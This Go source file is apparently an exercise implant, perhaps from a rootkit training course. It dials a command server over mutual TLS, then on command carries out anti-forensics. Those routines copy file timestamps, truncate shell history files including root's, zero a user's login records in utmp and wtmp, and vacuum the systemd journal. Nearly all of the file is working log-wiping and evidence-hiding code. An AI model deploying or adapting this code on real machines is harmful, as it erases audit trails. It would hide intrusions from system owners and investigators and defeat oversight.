package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

// utmpRecordSize is the size of a utmp/utmpx record on Linux amd64.
const utmpRecordSize = 384

// utmpUserOffset is the byte offset of ut_user in the record.
const utmpUserOffset = 44

// utmpUserLen is the maximum length of ut_user (including null terminator).
const utmpUserLen = 256

func main() {
	conn := dial()
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "PING":
			fmt.Fprintln(conn, "PONG")
		case "STATUS":
			fmt.Fprintf(conn, "PID=%d UID=%d ENV=%d\n", os.Getpid(), os.Getuid(), len(os.Environ()))
		case "CLEANUP":
			err := cleanup(arg)
			if err != nil {
				fmt.Fprintf(conn, "ERR %v\n", err)
			} else {
				fmt.Fprintln(conn, "OK")
			}
		case "TIMESTOMP":
			// arg = "target reference"
			files := strings.SplitN(arg, " ", 2)
			if len(files) != 2 {
				fmt.Fprintln(conn, "ERR need target and reference paths")
				continue
			}
			err := timestomp(files[0], files[1])
			if err != nil {
				fmt.Fprintf(conn, "ERR %v\n", err)
			} else {
				fmt.Fprintln(conn, "OK")
			}
		default:
			fmt.Fprintf(conn, "ERR unknown command: %s\n", cmd)
		}
	}
}

// dial establishes an mTLS connection to the server.
func dial() *tls.Conn {
	cert, err := tls.X509KeyPair(agentCert, agentKey)
	if err != nil {
		log.Fatalf("load agent cert: %v", err)
	}

	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caCert)

	conn, err := tls.Dial("tcp", serverAddr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS13,
	})
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	return conn
}

// timestomp copies the mtime from reference to target, making the target
// blend in with surrounding files.
func timestomp(target, reference string) error {
	info, err := os.Stat(reference)
	if err != nil {
		return fmt.Errorf("stat reference: %w", err)
	}
	mtime := info.ModTime()
	return os.Chtimes(target, mtime, mtime)
}

// clearHistory truncates common shell history files.
func clearHistory(username string) error {
	paths := []string{
		os.Getenv("HOME") + "/.bash_history",
		os.Getenv("HOME") + "/.zsh_history",
		os.Getenv("HOME") + "/.history",
		"/root/.bash_history",
		"/home/" + username + "/.bash_history",
		"/home/" + username + "/.zsh_history",
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			os.Truncate(p, 0)
		}
	}
	return nil
}

// scrubUtmp removes login records for username from utmp and wtmp.
// Each record is utmpRecordSize bytes. Walk the file, zero records
// where ut_user matches username.
func scrubUtmp(username string) error {
	files := []string{"/var/run/utmp", "/var/log/wtmp"}
	record := make([]byte, utmpRecordSize)
	zeros := make([]byte, utmpRecordSize)

	for _, path := range files {
		f, err := os.OpenFile(path, os.O_RDWR, 0)
		if err != nil {
			continue
		}

		for {
			_, err := io.ReadFull(f, record)
			if err != nil {
				break
			}
			user := extractUser(record)
			if user == username {
				// Seek back one record and overwrite with zeros.
				f.Seek(-utmpRecordSize, io.SeekCurrent)
				f.Write(zeros)
			}
		}

		f.Close()
	}
	return nil
}

// tamperJournal vacuums the systemd journal and rotates the active file.
func tamperJournal() error {
	if out, err := exec.Command("/usr/bin/journalctl", "--sync").CombinedOutput(); err != nil {
		return fmt.Errorf("sync journal: %w: %s", err, strings.TrimSpace(string(out)))
	}
	if out, err := exec.Command("/usr/bin/journalctl", "--rotate", "--vacuum-time=1s").CombinedOutput(); err != nil {
		return fmt.Errorf("rotate and vacuum journal: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// cleanup orchestrates all anti-forensics routines.
// username is the login name to scrub from utmp/wtmp.
// If empty, defaults to the current user.
func cleanup(username string) error {
	if username == "" {
		username = os.Getenv("USER")
	}

	if err := timestomp(os.Args[0], "/etc/hostname"); err != nil {
		return err
	}
	if err := clearHistory(username); err != nil {
		return err
	}
	if err := scrubUtmp(username); err != nil {
		return err
	}
	if err := tamperJournal(); err != nil {
		return err
	}
	os.Clearenv()

	return nil
}

// extractUser reads the ut_user field from a utmp record buffer.
func extractUser(record []byte) string {
	if len(record) < utmpUserOffset+utmpUserLen {
		return ""
	}
	raw := record[utmpUserOffset : utmpUserOffset+utmpUserLen]
	end := bytes.IndexByte(raw, 0)
	if end < 0 {
		end = utmpUserLen
	}
	return string(raw[:end])
}
